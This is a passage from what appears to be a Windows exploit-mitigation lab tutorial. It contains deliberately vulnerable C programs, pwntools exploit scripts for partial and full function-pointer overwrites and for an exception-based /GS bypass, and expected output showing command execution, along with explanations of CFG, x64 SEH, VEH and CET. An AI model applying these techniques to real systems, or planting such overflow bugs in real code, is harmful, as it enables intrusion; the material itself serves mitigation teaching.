    fread reads up to 40 bytes into name[32].
    Bytes 32-39 overflow into the action pointer.
    We only need to overwrite the low byte(s) to redirect.
    """
    binary_path = r'C:\Windows_Mitigations_Lab\bin\partial_overwrite.exe'

    log.info("Phase 1: reading addresses from binary output...")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter packet name", timeout=5)
    except:
        log.error("Timeout waiting for prompt")
        p.close()
        return

    # Auto-parse addresses
    log_addr = parse_address(output, 'log_message')
    exec_addr = parse_address(output, 'exec_command')

    if not log_addr or not exec_addr:
        log.error("Could not parse addresses")
        p.close()
        return

    log.success(f"log_message  = 0x{log_addr:016X}")
    log.success(f"exec_command = 0x{exec_addr:016X}")

    # Calculate how many low bytes differ
    xor = log_addr ^ exec_addr
    n_bytes = (xor.bit_length() + 7) // 8
    low_bytes = (exec_addr & ((1 << (n_bytes * 8)) - 1)).to_bytes(n_bytes, 'little')

    log.info(f"Addresses differ in lowest {n_bytes} byte(s)")
    log.info(f"Overwriting with: {low_bytes.hex()} (little-endian)")

    # Build payload:
    # name[0..8]   = "calc.exe\0" (passed as arg to action(name))
    # name[9..31]  = padding
    # name[32..32+n] = low bytes of exec_command
    command = b"calc.exe\x00"
    padding = b"X" * (32 - len(command))
    payload = command + padding + low_bytes

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(f"  [0..{len(command)-1}]   command: {command}")
    log.info(f"  [{len(command)}..31]  padding: {len(padding)} bytes")
    log.info(f"  [32..{32+n_bytes-1}]   low bytes: {low_bytes.hex()} (partial overwrite)")

    p.send(payload)
    p.shutdown('send')

    try:
        output = p.recvall(timeout=5)
        log.info(f"Output:\n{output.decode(errors='replace')}")

        if b"[EXEC]" in output:
            log.success("Partial overwrite worked! exec_command was called!")
        elif b"[LOG]" in output:
            log.failure("Still calling log_message - check byte count")
        else:
            log.warning("Unexpected output")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        log.info(f"Exit code: {hex(exit_code)}")

    p.close()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        exploit()
    else:
        discover()
```

**Expected Results**:

```bash
# Discovery phase (addresses auto-parsed):
c:\Windows_Mitigations_Lab> python exploits\sc_2_partial.py
#[*] Discovery: running binary to get function addresses
#[*] Output:
#    log_message  @ 0000000140001F96
#    exec_command @ 00000001400043C7
#    Offset between: 9265 bytes
#[+] log_message  = 0x0000000140001F96
#[+] exec_command = 0x00000001400043C7
#[*] Addresses differ in lowest 2 byte(s)
#[*] Low bytes to overwrite (LE): c743

# Exploitation phase (auto-parsed — no manual update needed):
c:\Windows_Mitigations_Lab> python exploits\sc_2_partial.py --exploit
#[*] Phase 1: reading addresses from binary output...
#[+] log_message  = 0x0000000140001F96
#[+] exec_command = 0x00000001400043C7
#[*] Addresses differ in lowest 2 byte(s)
#[*] Overwriting with: c743 (little-endian)
#[*] Payload (34 bytes):
#[*]   [0..8]   command: b'calc.exe\x00'
#[*]   [9..31]  padding: 23 bytes
#[*]   [32..33]   low bytes: c743 (partial overwrite)
#[*] Output:
#    [*] Read 34 bytes
#    [*] Processing packet: name='calc.exe'
#    [*] Action ptr: 00000001400043C7     <- redirected!
#    [EXEC] Running: calc.exe             <- RCE!
#[+] Partial overwrite worked! exec_command was called!
```

> [!IMPORTANT]
> **Partial Overwrite vs Full Overwrite**: This technique only needs 1-2 bytes of overflow
> past the buffer boundary. Many bugs that seem "too small to exploit" (off-by-one,
> off-by-few) become exploitable when a function pointer is adjacent in a struct.
> ASLR makes this harder (randomizes upper bytes too). Note: MSVC CFG (`/guard:cf`) does
> NOT block this because the target (`exec_command`) is a valid function entry point — CFG
> is coarse-grained (see Technique 3's `--cfg-test` for proof).

#### Technique 3: Overwriting Function Pointers (stdin-based)

Same concept as Technique 1 but using a local binary with stdin input instead of a
network server. This demonstrates that the struct-based function pointer overwrite
works identically for local exploits.

**Vulnerable Code (Windows)**:

```c
// func_ptr_overwrite.c
// Demonstrates: struct-based function pointer overwrite via stdin
// Same principle as the network server (Technique 1), but as a local binary.
//
// The struct guarantees member order. /GS cannot reorder struct internals.
// fgets() overflow past data[128] directly overwrites handler at offset 128.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef void (*callback_t)(const char*);

// /GS does NOT reorder struct members
struct request {
    char data[128];          // offset 0   - overflow source
    callback_t handler;      // offset 128 - overflow target
    int status;              // offset 136
};

void safe_handler(const char* msg) {
    printf("[SAFE] Handler: %s\n", msg);
}

void dangerous_handler(const char* msg) {
    printf("[DANGER] Executing: %s\n", msg);
    system(msg);  // RCE!
}

void process_request(struct request *req) {
    printf("[*] Processing request...\n");
    printf("[*] Handler points to: %p\n", (void*)req->handler);
    fflush(stdout);

    // Call handler with data - indirect CALL, not RET
    // CET shadow stacks don't protect this
    req->handler(req->data);
}

int main() {
    struct request req;

    req.handler = safe_handler;
    req.status = 0;
    memset(req.data, 0, 128);

    printf("safe_handler      @ %p\n", (void*)safe_handler);
    printf("dangerous_handler @ %p\n", (void*)dangerous_handler);
    printf("req.data          @ %p\n", req.data);
    printf("req.handler       @ %p (offset %zu from data)\n",
           &req.handler, (char*)&req.handler - req.data);
    fflush(stdout);

    printf("\nEnter request data: ");
    fflush(stdout);

    // VULNERABILITY: reads 256 bytes into 128-byte data field via fread
    // fread handles binary data correctly (no newline issues)
    int n = (int)fread(req.data, 1, 256, stdin);
    printf("[*] Read %d bytes\n", n);
    fflush(stdout);

    process_request(&req);

    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\func_ptr_overwrite.c
cd C:\Windows_Mitigations_Lab

# WITHOUT /GS - baseline
cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
   /Fe:bin\func_ptr_overwrite.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# WITH /GS - prove struct members are NOT reordered
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
   /Fe:bin\func_ptr_overwrite_gs.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# WITH CFG - observe coarse-grained protection
cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
   /Fe:bin\func_ptr_overwrite_cfg.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /guard:cf /DEBUG
```

**Pwntools Exploit - Function Pointer Overwrite**:

```python
#!/usr/bin/env python3
"""
exploits/sc_3_funcptr.py
Function Pointer Overwrite via stdin - Bypasses /GS Stack Cookies

Same struct-based technique as the network server exploit (Technique 1),
but targeting a local binary that reads from stdin via fread().

struct request { char data[128]; callback_t handler; int status; };
fread() overflow: 256 bytes into data[128] overwrites handler at offset 128.

Addresses are auto-parsed from the binary's runtime output — no manual
updates needed between rebuilds.

Works on Windows 11 + CET: struct member corruption, not return address.
NOT blocked by coarse-grained CFG (target is a valid function entry).
Blocked by: fine-grained CFI (Clang -fsanitize=cfi).

Usage:
  python exploits\\sc_3_funcptr.py            # Discovery
  python exploits\\sc_3_funcptr.py --exploit   # Exploitation
"""

from pwn import *
import re
import sys

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def parse_address(output_bytes, label):
    """
    Parse a function address from binary output.
    Handles MSVCRT bare-hex (0000000140001F96) and 0x-prefixed formats.
    """
    decoded = output_bytes.decode(errors='replace')
    pattern = rf'{re.escape(label)}\s+@\s+(0x)?([0-9A-Fa-f]+)'
    m = re.search(pattern, decoded)
    if m:
        return int(m.group(2), 16)
    return None


def parse_offset(output_bytes):
    """
    Parse the handler offset from 'offset NNN from data' in binary output.
    """
    decoded = output_bytes.decode(errors='replace')
    m = re.search(r'offset\s+(\d+)\s+from\s+data', decoded)
    if m:
        return int(m.group(1))
    return 128  # default fallback


def discover():
    """Run the binary to find function addresses and verify struct layout."""
    binary_path = r'C:\Windows_Mitigations_Lab\bin\func_ptr_overwrite.exe'

    log.info("Discovery: running binary to find addresses")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
        log.info(f"Output:\n{output.decode(errors='replace')}")
    except:
        pass

    # Send cyclic pattern to find exact offset
    pattern = cyclic(256)
    p.send(pattern)
    p.shutdown('send')

    try:
        rest = p.recvall(timeout=5)
        log.info(f"Rest:\n{rest.decode(errors='replace')}")
    except:
        pass
    p.close()

    # Auto-parse addresses
    safe_addr = parse_address(output, 'safe_handler')
    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)

    if safe_addr and danger_addr:
        log.success(f"safe_handler      = 0x{safe_addr:016X}")
        log.success(f"dangerous_handler = 0x{danger_addr:016X}")
        log.info(f"Handler offset from data: {offset}")
        log.info(f"")
        log.info(f"Run: python exploits\\sc_3_funcptr.py --exploit")
    else:
        log.error("Could not parse addresses from output")


def exploit():
    """Overwrite handler with dangerous_handler address (auto-parsed)."""
    binary_path = r'C:\Windows_Mitigations_Lab\bin\func_ptr_overwrite.exe'

    log.info("Phase 1: reading addresses from binary output...")
    p = process([binary_path])

    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
    except:
        log.error("Timeout waiting for prompt")
        p.close()
        return

    # Auto-parse dangerous_handler address and offset
    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)

    if not danger_addr:
        log.error("Could not parse dangerous_handler address")
        p.close()
        return

    log.success(f"dangerous_handler = 0x{danger_addr:016X} (auto-parsed)")
    log.info(f"Handler at offset {offset} from buffer start")

    # Build payload:
    # data[0..8]       = "calc.exe\0" (command for system())
    # data[9..off-1]   = padding
    # data[off..off+7] = p64(dangerous_handler)  -> overwrites handler
    command = b"calc.exe\x00"
    padding = b"B" * (offset - len(command))
    payload = command + padding + p64(danger_addr)

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(f"  [0..{len(command)-1}]     command: {command}")
    log.info(f"  [{len(command)}..{offset-1}]  padding: {len(padding)} bytes")
    log.info(f"  [{offset}..{offset+7}] handler: 0x{danger_addr:X}")

    p.send(payload)
    p.shutdown('send')

    try:
        output = p.recvall(timeout=5)
        log.info(f"Output:\n{output.decode(errors='replace')}")

        if b"[DANGER]" in output:
            log.success("Function pointer overwrite worked!")
            log.success("dangerous_handler called system(\"calc.exe\")")
        elif b"[SAFE]" in output:
            log.failure("Still calling safe_handler - offset wrong")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        log.info(f"Exit code: {hex(exit_code)}")
        if exit_code == 0xc0000409:
            log.info("GS cookie check fired AFTER handler ran (expected)")

    p.close()


def cfg_test():
    """
    Demonstrate the difference between coarse-grained CFG and fine-grained.

    CFG maintains a bitmap of ALL valid function entry points. It checks:
      "Is the target address a valid function start?" — YES/NO.
    It does NOT check:
      "Is this specific call site allowed to call this specific function?"

    So redirecting handler from safe_handler -> dangerous_handler WORKS
    even with CFG, because dangerous_handler is a valid function entry.

    But redirecting to a MID-FUNCTION address (e.g., dangerous_handler+4)
    FAILS because that's not in the CFG bitmap.

    This test proves both behaviors.
    """
    binary_path = r'C:\Windows_Mitigations_Lab\bin\func_ptr_overwrite_cfg.exe'

    log.info("CFG Test: demonstrating coarse-grained vs fine-grained")
    log.info("")

    # --- Test 1: redirect to dangerous_handler (valid function entry) ---
    log.info("=" * 60)
    log.info("TEST 1: Redirect to dangerous_handler (valid function entry)")
    log.info("=" * 60)

    p = process([binary_path])
    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
    except:
        pass

    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)

    if not danger_addr:
        log.error("Could not parse dangerous_handler")
        p.close()
        return

    log.info(f"dangerous_handler = 0x{danger_addr:X} (valid function entry)")

    command = b"calc.exe\x00"
    padding = b"B" * (offset - len(command))
    payload = command + padding + p64(danger_addr)
    p.send(payload)
    p.shutdown('send')

    try:
        out1 = p.recvall(timeout=5)
        log.info(f"Output:\n{out1.decode(errors='replace')}")
        if b"[DANGER]" in out1:
            log.success("CFG ALLOWED the call — target is a valid function entry!")
        elif b"[SAFE]" in out1:
            log.failure("Still safe_handler")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass
    exit1 = (p.returncode or 0) & 0xFFFFFFFF
    log.info(f"Exit code: {hex(exit1)}")
    p.close()

    # --- Test 2: redirect to mid-function address (NOT a valid entry) ---
    log.info("")
    log.info("=" * 60)
    log.info("TEST 2: Redirect to dangerous_handler+4 (mid-function, NOT in CFG bitmap)")
    log.info("=" * 60)

    p = process([binary_path])
    output = b""
    try:
        output = p.recvuntil(b"Enter request data:", timeout=5)
    except:
        pass

    danger_addr = parse_address(output, 'dangerous_handler')
    offset = parse_offset(output)
    mid_func = danger_addr + 4  # NOT a function entry point

    log.info(f"dangerous_handler+4 = 0x{mid_func:X} (mid-function, invalid CFG target)")

    command = b"calc.exe\x00"
    padding = b"B" * (offset - len(command))
    payload = command + padding + p64(mid_func)
    p.send(payload)
    p.shutdown('send')

    try:
        out2 = p.recvall(timeout=5)
        log.info(f"Output:\n{out2.decode(errors='replace')}")
        if b"[DANGER]" in out2:
            log.warning("Call went through — CFG didn't catch mid-function?")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass
    exit2 = (p.returncode or 0) & 0xFFFFFFFF
    log.info(f"Exit code: {hex(exit2)}")

    # CFG violation triggers __fastfail(FAST_FAIL_GUARD_ICALL_CHECK_FAILURE)
    # which raises STATUS_BREAKPOINT (0x80000003) via int 0x29
    if exit2 in (0x80000003, 0xc0000409):
        log.success("CFG BLOCKED the call — target is NOT a valid function entry!")
        if exit2 == 0x80000003:
            log.info("  STATUS_BREAKPOINT via __fastfail (CFG kill mechanism)")
    elif exit2 == 0xc0000005:
        log.success("Access Violation — mid-function jump crashed")
    else:
        log.info(f"Unexpected exit code (may still indicate CFG block)")

    p.close()

    # --- Summary ---
    log.info("")
    log.info("=" * 60)
    log.info("CONCLUSION:")
    log.info("  CFG is COARSE-GRAINED — it checks if the target is ANY valid")
    log.info("  function entry point, not whether THIS call site should call")
    log.info("  THAT specific function.")
    log.info("")
    log.info("  -> Redirect to another valid function: CFG ALLOWS (demonstrated!)")
    log.info("  -> Redirect to mid-function / shellcode:  CFG BLOCKS")
    log.info("")
    log.info("  Fine-grained CFI (e.g., Clang CFI, LLVM type-based) would block")
    log.info("  the valid-function redirect too, by checking type signatures.")
    log.info("=" * 60)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--exploit":
        exploit()
    elif len(sys.argv) > 1 and sys.argv[1] == "--cfg-test":
        cfg_test()
    else:
        discover()
```

**Expected Results**:

```bash
# Discovery:
c:\Windows_Mitigations_Lab> python exploits\sc_3_funcptr.py
#[*] Output:
#    safe_handler      @ 0000000140001F8C
#    dangerous_handler @ 00000001400043BD
#    req.data          @ 000000000014F930
#    req.handler       @ 000000000014F9B0 (offset 128 from data)
#
#[*] Rest:
#    [*] Read 256 bytes
#    [*] Processing request...
#    [*] Handler points to: 6261616962616168  <- cyclic at offset 128!

# Exploitation (address auto-parsed — no manual update needed):
c:\Windows_Mitigations_Lab> python exploits\sc_3_funcptr.py --exploit
#[*] Phase 1: reading addresses from binary output...
#[+] dangerous_handler = 0x00000001400043C7 (auto-parsed)
#[*] Handler at offset 128 from buffer start
#[*] Payload (136 bytes):
#[*]   [0..8]     command: b'calc.exe\x00'
#[*]   [9..127]   padding: 119 bytes
#[*]   [128..135]  handler: 0x1400043C7
#[*] Output:
#    [*] Read 136 bytes
#    [*] Processing request...
#    [*] Handler points to: 00000001400043C7
#    [DANGER] Executing: calc.exe                <- RCE!
#[+] Function pointer overwrite worked!

# All three builds: same result (including CFG build!)
# Why? See CFG test below.

# CFG coarse-grained test:
c:\Windows_Mitigations_Lab> python exploits\sc_3_funcptr.py --cfg-test
#[*] TEST 1: Redirect to dangerous_handler (valid function entry)
#[+] CFG ALLOWED the call — target is a valid function entry!
#[*] Exit code: 0x0
#
#[*] TEST 2: Redirect to dangerous_handler+4 (mid-function, NOT in CFG bitmap)
#[+] CFG BLOCKED the call — target is NOT a valid function entry!
#[*]   STATUS_BREAKPOINT via __fastfail (CFG kill mechanism)
#[*] Exit code: 0x80000003
#
#[*] CONCLUSION:
#[*]   CFG is COARSE-GRAINED — it checks if the target is ANY valid
#[*]   function entry point, not whether THIS call site should call
#[*]   THAT specific function.
```

| Build                        | /GS | CFG | Target                | Result      | Why                                            |
| ---------------------------- | --- | --- | --------------------- | ----------- | ---------------------------------------------- |
| `func_ptr_overwrite.exe`     | OFF | OFF | `dangerous_handler`   | **RCE**     | No protection at all                           |
| `func_ptr_overwrite_gs.exe`  | ON  | OFF | `dangerous_handler`   | **RCE**     | /GS doesn't reorder struct members             |
| `func_ptr_overwrite_cfg.exe` | ON  | ON  | `dangerous_handler`   | **RCE**     | CFG allows — target is a valid function entry  |
| `func_ptr_overwrite_cfg.exe` | ON  | ON  | `dangerous_handler+4` | **Blocked** | CFG blocks — mid-function is not in CFG bitmap |

> [!WARNING]
> **CFG is coarse-grained!** It maintains a bitmap of valid function entry points and
> checks "is the target ANY valid function start?" — not "is this specific call site
> allowed to call this specific function?"
>
> This means redirecting `handler` from `safe_handler` to `dangerous_handler` **passes
> CFG validation** because `dangerous_handler` is a legitimate function. Only calls to
> addresses that are NOT function entries (shellcode, ROP gadgets, mid-function offsets)
> are blocked.
>
> **Fine-grained CFI** (e.g., Clang's `-fsanitize=cfi`, LLVM type-based CFI) would block
> this by checking that the function pointer's **type signature** matches the call site.
> MSVC does not currently offer fine-grained CFI.
>
> **Key takeaway**: CFG stops shellcode injection and ROP chains via indirect calls, but
> does NOT prevent redirecting between valid functions of compatible signatures.

#### Technique 4: Exception-Based Bypass

Trigger a controlled exception BEFORE the function epilogue runs the cookie check.
The cookie is only verified at function return (`__security_check_cookie`), so if an
exception diverts control flow before that point, the cookie is never checked.

> [!WARNING]
> **x64 vs x86**: On x86, the classic version of this attack overwrites the SEH chain on
> the stack to hijack exception handling. On x64 Windows, SEH is **table-based** (stored in
> the read-only `.pdata` section), so SEH chain overwrites are impossible.
>
> On x64, the exception-based bypass instead demonstrates that the cookie check is skipped
> entirely when an exception fires mid-function. The attacker doesn't gain code execution
> through the exception handler itself, but through data already corrupted before the
> exception (e.g., a function pointer in a struct that was called, or a variable that
> controls a security decision).

**Vulnerable Code**:

```c
// exception_bypass.c
// Demonstrates: exception fires BEFORE cookie check, proving /GS has a window
// of vulnerability between buffer overflow and function epilogue.
//
// This binary uses a struct with a flag field. The overflow corrupts the flag
// BEFORE an intentional null dereference triggers an exception. The __except
// handler checks the (now-corrupted) flag and grants elevated access.
//
// This is a data-only attack: no return address or function pointer corruption.

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>

struct session {
    char username[64];     // offset 0   - overflow source
    int is_admin;          // offset 64  - overflow target (security flag)
    char *profile_ptr;     // offset 72  - will be NULL -> exception
};

void handle_request(const char *input) {
    struct session sess;
    sess.is_admin = 0;          // Not admin by default
    sess.profile_ptr = NULL;    // Will cause exception when dereferenced

    printf("[*] Session initialized: is_admin=%d\n", sess.is_admin);
    fflush(stdout);

    // VULNERABILITY: copies more than 64 bytes into username[64]
    // Overflow corrupts is_admin and profile_ptr
    memcpy(sess.username, input, strlen(input));

    printf("[*] After input: is_admin=%d, profile_ptr=%p\n",
           sess.is_admin, (void*)sess.profile_ptr);
    fflush(stdout);

    // This __try/__except block catches the null deref exception.
    // The cookie check at function return is NEVER reached because
    // exception handling transfers control to the __except block.
    __try {
        // Dereference profile_ptr directly - WILL crash on NULL or garbage.
        // NOTE: printf("%s", NULL) on MSVCRT prints "(null)" instead of
        // crashing, so we MUST use a direct memory read to trigger the
        // access violation.
        char first = sess.profile_ptr[0];  // ACCESS VIOLATION here!
        printf("[*] Profile loaded: %c...\n", first);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] Exception caught (null/bad pointer dereference)\n");
        fflush(stdout);

        // BUG: checking a variable that was corrupted by the overflow!
        // The developer assumed is_admin couldn't be corrupted because
        // /GS "protects the stack". But the overflow happened in a struct,
        // and the exception skipped the cookie check entirely.
        if (sess.is_admin == 0x41414141) {
            // In a real app this might check is_admin != 0
            printf("[!] ADMIN ACCESS GRANTED (is_admin was corrupted!)\n");
            printf("[!] Executing admin command...\n");
            fflush(stdout);
            system("whoami");  // Simulating privileged action
        } else {
            printf("[*] Access denied (is_admin=%d)\n", sess.is_admin);
        }
    }
    // Cookie check would happen HERE at function return.
    // But if we entered the __except block, the corrupted cookie
    // was already "handled" by the exception mechanism.
    printf("[*] Function returning (cookie check happens now)...\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    printf("=== Exception-Based /GS Bypass Demo ===\n");
    printf("struct session layout:\n");
    printf("  username[64]  @ offset 0\n");
    printf("  is_admin      @ offset 64\n");
    printf("  profile_ptr   @ offset 72\n");
    fflush(stdout);

    if (argc > 1) {
        handle_request(argv[1]);
    } else {
        printf("\nUsage: exception_bypass.exe <input>\n");
        printf("Try: exception_bypass.exe %s\n",
               "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
               "AAAA");
    }
    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\exception_bypass.c
cd C:\Windows_Mitigations_Lab

# WITH /GS - to show exception bypasses cookie check
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\exception_bypass.c ^
   /Fe:bin\exception_bypass.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

```

**Pwntools - Exception-Based Bypass**:

```python
#!/usr/bin/env python3
"""
exploits/sc_4_exception.py
Exception-Based Stack Cookie Bypass

The overflow corrupts a security flag (is_admin) in a struct. Before the
function returns (where /GS checks the cookie), a null pointer dereference
triggers an exception. The __except handler reads the corrupted is_admin
flag and grants admin access.

This demonstrates that /GS only protects at function RETURN. Any security
decision made between the overflow and the return is vulnerable.

Works on Windows 11 + CET: no return address or function pointer corruption.
This is a pure data-only attack targeting a security-critical variable.

Usage:
  python exploits\\sc_4_exception.py
"""

from pwn import *

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def exploit():
    binary_path = r'C:\Windows_Mitigations_Lab\bin\exception_bypass.exe'

    # struct session layout:
    #   username[64]   @ offset 0     (64 bytes)
    #   is_admin       @ offset 64    (4 bytes, int)
    #   profile_ptr    @ offset 72    (8 bytes, after padding)
    #
    # Overflow username to set is_admin = 0x41414141 ("AAAA")
    # profile_ptr gets corrupted too -> causes exception -> __except fires
    # __except checks corrupted is_admin -> grants access

    USERNAME_SIZE = 64
    IS_ADMIN_OFFSET = 64
    # profile_ptr is at offset 72 (after 4 bytes padding between int and pointer)
    PROFILE_PTR_OFFSET = 72

    # Fill username buffer
    payload = b"A" * USERNAME_SIZE
    # Overflow into is_admin: set to 0x41414141 ("AAAA")
    payload += b"A" * 4  # is_admin = 0x41414141 (bytes 64-67)
    # Padding between is_admin (int, 4 bytes) and profile_ptr (8-byte aligned)
    payload += b"A" * 4  # padding bytes 68-71
    # Corrupt profile_ptr with garbage address -> access violation in __try
    # 0x4141414141414141 is unmapped -> guaranteed crash
    payload += b"A" * 8  # profile_ptr = 0x4141414141414141 (bytes 72-79)

    log.info(f"Payload: {len(payload)} bytes")
    log.info(f"  [0..63]   username: 64 x 'A'")
    log.info(f"  [64..67]  is_admin: 0x41414141 ('AAAA')")
    log.info(f"  [68..71]  padding:  4 x 'A'")
    log.info(f"  [72..79]  profile_ptr: 0x4141414141414141 (garbage -> crash)")

    # Pass payload as command line argument
    # Since it's all 'A' characters, no binary data issues with argv
    p = process([binary_path, payload.decode('latin-1')])

    try:
        output = p.recvall(timeout=5)
        decoded = output.decode(errors='replace')
        log.info(f"Output:\n{decoded}")

        if "ADMIN ACCESS GRANTED" in decoded:
            log.success("Exception-based bypass worked!")
            log.success("/GS cookie was NEVER checked - exception skipped it")
            log.success("Corrupted is_admin was trusted in __except handler")
        elif "Access denied" in decoded:
            log.failure("is_admin not corrupted correctly - adjust offset")
        elif "c0000409" in decoded.lower():
            log.failure("/GS caught the corruption before exception fired")
        else:
            log.warning("Unexpected output - check manually")
    except:
        pass

    try:
        p.wait(timeout=3)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        log.info(f"Exit code: {hex(exit_code)}")
        if exit_code == 0xc0000409:
            log.info("GS cookie check fired at function return (after __except)")
            log.info("But the damage is done - admin action already executed!")
        elif exit_code == 0:
            log.info("Clean exit - exception was handled, cookie was OK")

    p.close()


if __name__ == "__main__":
    exploit()
```

**Expected Results**:

```bash
c:\Windows_Mitigations_Lab> python exploits\sc_4_exception.py
#[*] Payload: 80 bytes
#[*]   [0..63]   username: 64 x 'A'
#[*]   [64..67]  is_admin: 0x41414141 ('AAAA')
#[*]   [68..71]  padding:  4 x 'A'
#[*]   [72..79]  profile_ptr: 0x4141414141414141 (garbage -> crash)
#[*] Output:
#    === Exception-Based /GS Bypass Demo ===
#    struct session layout:
#      username[64]  @ offset 0
#      is_admin      @ offset 64
#      profile_ptr   @ offset 72
#    [*] Session initialized: is_admin=0
#    [*] After input: is_admin=1094795585, profile_ptr=4141414141414141
#    [!] Exception caught (null/bad pointer dereference)
#    [!] ADMIN ACCESS GRANTED (is_admin was corrupted!)
#    [!] Executing admin command...
#    dev\user                                     <- whoami output
#    [*] Function returning (cookie check happens now)...
#[+] Exception-based bypass worked!
#[+] /GS cookie was NEVER checked - exception skipped it
#[+] Corrupted is_admin was trusted in __except handler
#[*] Exit code: 0x0
```

> [!IMPORTANT]
> **Why This Works**: The `/GS` cookie is checked in the function **epilogue** (right before
> `ret`). If an exception occurs mid-function, the `__except` handler runs in a different
> context. The corrupted `is_admin` variable is read in the handler before the cookie is
> ever validated. This is a fundamental limitation of stack cookies — they're a **post-hoc**
> check, not a prevention mechanism.
>
> **On x64**: This is NOT an SEH chain overwrite (impossible on x64). Instead, it's a
> data-only attack where the exception mechanism happens to skip past the cookie check,
> giving the attacker a window to exploit corrupted data.
>
> **CET**: Completely irrelevant here. No control flow is hijacked — the exception
> mechanism works normally. The attacker only corrupted a data variable (`is_admin`).

### x64 Exception Handling Deep Dive

On x64 Windows, exception handling is fundamentally different from x86.
Understanding this is crucial since SafeSEH and SEH exploits don't apply.

#### Table-Based Exception Handling

```c
// x64 uses table-based unwinding stored in PE headers
// No SEH chain on stack = no SEH overwrites!

// .pdata section contains RUNTIME_FUNCTION entries:
typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;      // RVA of function start
    DWORD EndAddress;        // RVA of function end
    DWORD UnwindData;        // RVA of UNWIND_INFO
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

// UNWIND_INFO describes how to unwind the function:
typedef struct _UNWIND_INFO {
    UBYTE Version       : 3;
    UBYTE Flags         : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode[1];
    // Followed by optional exception handler info
} UNWIND_INFO, *PUNWIND_INFO;
```

**Examining .pdata in WinDbg**:

```bash
# Dump RUNTIME_FUNCTION entries
!dh -f myapp  # Show headers
lm m myapp    # Get base address

# Find .pdata section
!dh myapp -s
# Look for .pdata section

# Dump some RUNTIME_FUNCTION entries
dps myapp+<pdata_rva> L20

# Examine specific function's unwind info
.fnent myapp!vulnerable_function
# Shows: BeginAddress, EndAddress, UnwindInfoAddress
# And the actual unwind operations
```

**Why x64 Is More Secure**:

```text
x86 SEH:
- Chain of handlers on STACK
- Attacker controls stack -> controls handlers
- Classic exploitation technique

x64 Table-based:
- Handler info in READ-ONLY .pdata section
- Cannot overwrite via buffer overflow
- Exception handling doesn't read attacker-controlled data

Result: Classic SEH overwrite impossible on x64
```

#### Vectored Exception Handlers (VEH)

VEH is an alternative that exists on both x86 and x64:

```c
// VEH registration (application can add custom handlers)
PVOID WINAPI AddVectoredExceptionHandler(
    ULONG First,                          // 1 = first handler, 0 = last
    PVECTORED_EXCEPTION_HANDLER Handler   // Callback function
);

// VEH handlers stored in ntdll:
// - LdrpVectorHandlerList (doubly linked list in heap)
// - If attacker can corrupt heap -> corrupt VEH list
// - But... heap has its own protections now
```

**VEH Internal Structure**:

```c
// Internal VEH entry structure (undocumented)
typedef struct _VECTORED_HANDLER_ENTRY {
    LIST_ENTRY List;                       // Forward/backward links
    PVOID      Unknown1;                   // Reserved
    ULONG      Refs;                       // Reference count
    PVECTORED_EXCEPTION_HANDLER Handler;   // The actual handler!
} VECTORED_HANDLER_ENTRY;

// Located via:
// ntdll!LdrpVectorHandlerList
// ntdll!RtlpCallVectoredHandlers
```

**WinDbg VEH Analysis**:

```bash
# Find VEH list
x ntdll!LdrpVectorHandlerList
dps ntdll!LdrpVectorHandlerList L4

# Each entry points to VECTORED_HANDLER_ENTRY
# Handler offset is +0x18 on x64

dt ntdll!_LIST_ENTRY poi(ntdll!LdrpVectorHandlerList)
```

### Intel CET Shadow Stack

Intel Control-flow Enforcement Technology provides **hardware-backed** return address protection,
making stack cookie bypasses significantly harder.

#### How Shadow Stack Works

```text
Normal Stack (writable):          Shadow Stack (read-only to user):
┌─────────────────────┐           ┌─────────────────────┐
│   Local Variables   │           │                     │
├─────────────────────┤           │                     │
│   Saved RBP         │           │                     │
├─────────────────────┤           ├─────────────────────┤
│   Return Address    │ --------> │   Return Address    │
└─────────────────────┘           └─────────────────────┘

CALL instruction:
  1. Pushes return address to normal stack
